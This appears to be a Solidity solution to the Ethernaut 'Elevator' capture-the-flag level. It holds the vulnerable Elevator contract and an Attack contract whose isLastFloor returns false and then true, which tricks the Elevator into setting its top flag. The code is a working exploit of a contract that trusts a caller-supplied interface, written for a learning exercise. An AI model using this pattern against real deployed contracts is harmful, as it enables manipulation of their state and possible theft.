// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
contract Attack is Building{
    Elevator elevator;
    bool entry;
    constructor(Elevator _elevator)public {
        elevator= _elevator;
    }

    function attack()public{
        elevator.goTo(1);
    }
    
    function isLastFloor(uint floor) external override returns (bool){
        if(!entry){
            entry = !entry;
            return false;
        }
        else{
            return true;
        }
    }

}